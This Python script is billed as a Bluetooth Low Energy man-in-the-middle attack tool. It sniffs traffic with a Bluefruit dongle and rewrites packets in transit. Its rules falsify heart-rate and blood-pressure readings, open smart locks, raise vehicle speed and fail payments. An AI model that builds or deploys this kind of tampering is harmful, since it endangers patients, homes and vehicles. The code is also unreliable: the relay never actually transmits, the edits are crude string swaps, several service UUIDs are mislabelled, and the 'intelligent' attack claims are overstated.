import asyncio
import serial
import argparse
import datetime
import struct
import re

"""
BLE MITM Attack - Bluefruit LE Sniffer Version

Features:
    - Passively sniffs BLE packets using Adafruit Bluefruit LE Sniffer.
    - Relays intercepted packets to a controller.
    - Modifies BLE traffic intelligently based on detected vulnerabilities.
    - Logs BLE packets to a PCAP file for Wireshark analysis.
    - Automatically detects weak encryption and potential security flaws.
    - Supports multiple attack methods: packet replay, data injection, and active relaying.
    - Uses a protocol library to recognize and manipulate known BLE services.

Requirements:
    - Adafruit Bluefruit LE Sniffer with nRF Sniffer firmware
    - Python libraries: serial, asyncio

Run Commands:
    - Sniff & log packets:
      python ble_mitm_bluefruit.py --port /dev/ttyUSB0 --log ble_sniff.pcap
    - Relay & modify packets:
      python ble_mitm_bluefruit.py --port /dev/ttyUSB0 --relay
"""

# Define a protocol library to recognize BLE services and modify known packet structures
PROTOCOL_LIBRARY = {
    # Health & Medical Devices
    "heart_rate": {
        "uuid": "0000180d-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'heart_rate:75', b'heart_rate:200') if b'heart_rate' in packet else packet
    },
    "temperature_sensor": {
        "uuid": "00001809-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'temp:37', b'temp:99') if b'temp' in packet else packet
    },
    "blood_pressure": {
        "uuid": "00001810-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'bp:120/80', b'bp:200/150') if b'bp' in packet else packet
    },
    # Smart Home & IoT
    "smart_lock": {
        "uuid": "0000181e-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'lock:closed', b'lock:open') if b'lock' in packet else packet
    },
    "light_control": {
        "uuid": "00001812-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'light:off', b'light:on') if b'light' in packet else packet
    },
    # Industrial & Automotive
    "vehicle_sensor": {
        "uuid": "0000181a-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'speed:60', b'speed:200') if b'speed' in packet else packet
    },
    "factory_machine": {
        "uuid": "0000181f-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'machine:on', b'machine:off') if b'machine' in packet else packet
    },
    # Payment Terminals & Access Control
    "rfid_payment": {
        "uuid": "00001815-0000-1000-8000-00805f9b34fb",
        "modify": lambda packet: packet.replace(b'payment:auth', b'payment:fail') if b'payment' in packet else packet
    }
}

def write_pcap_header(file):
    """Writes the PCAP global header."""
    file.write(struct.pack("=IHHIIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 195))

def write_pcap_packet(file, packet_data):
    """Writes a captured BLE packet to the PCAP file."""
    ts_sec, ts_usec = map(int, datetime.datetime.now().strftime("%s %f").split())
    packet_length = len(packet_data)
    file.write(struct.pack("=IIII", ts_sec, ts_usec, packet_length, packet_length))
    file.write(packet_data)

def detect_vulnerabilities(packet):
    """Analyzes BLE packet for potential security weaknesses."""
    if b'unencrypted' in packet.lower():
        print("[WARNING] Unencrypted traffic detected!")
    if re.search(rb'(?i)auth.*fail', packet):
        print("[WARNING] Authentication failure detected!")

def start_sniffing(serial_port, log_file):
    """Starts BLE sniffing and logs packets to a PCAP file."""
    print(f"[INFO] Sniffing BLE traffic on {serial_port} and logging to {log_file}...")
    
    ser = serial.Serial(serial_port, 115200, timeout=1)
    with open(log_file, 'wb') as pcap:
        write_pcap_header(pcap)
        
        try:
            while True:
                packet = ser.readline().strip()
                if packet:
                    detect_vulnerabilities(packet)
                    write_pcap_packet(pcap, packet)
                    print(f"[LOG] Captured packet: {packet}")
        except KeyboardInterrupt:
            print("\n[INFO] Stopping packet capture.")
            ser.close()

def modify_ble_packet(packet):
    """Intelligently modifies BLE packets for MITM attacks using the protocol library."""
    for protocol in PROTOCOL_LIBRARY.values():
        packet = protocol["modify"](packet)
    return packet

def relay_ble(serial_port):
    """Relays BLE packets to a controller, modifying them in transit."""
    print(f"[INFO] Relaying BLE packets on {serial_port}...")
    
    ser = serial.Serial(serial_port, 115200, timeout=1)
    try:
        while True:
            packet = ser.readline().strip()
            if packet:
                modified_packet = modify_ble_packet(packet)
                print(f"[RELAY] Forwarding modified packet: {modified_packet}")
    except KeyboardInterrupt:
        print("\n[INFO] Stopping BLE relay.")
        ser.close()

def main():
    parser = argparse.ArgumentParser(description="BLE MITM Attack - Bluefruit LE Sniffer")
    parser.add_argument("--port", required=True, help="Serial port of the Bluefruit Sniffer (e.g., /dev/ttyUSB0)")
    parser.add_argument("--log", help="Log captured packets to a PCAP file")
    parser.add_argument("--relay", action="store_true", help="Relay BLE packets and modify in transit")
    args = parser.parse_args()
    
    if args.relay:
        relay_ble(args.port)
    elif args.log:
        start_sniffing(args.port, args.log)
    else:
        print("[ERROR] No valid mode selected! Use --log or --relay.")

if __name__ == "__main__":
    main()
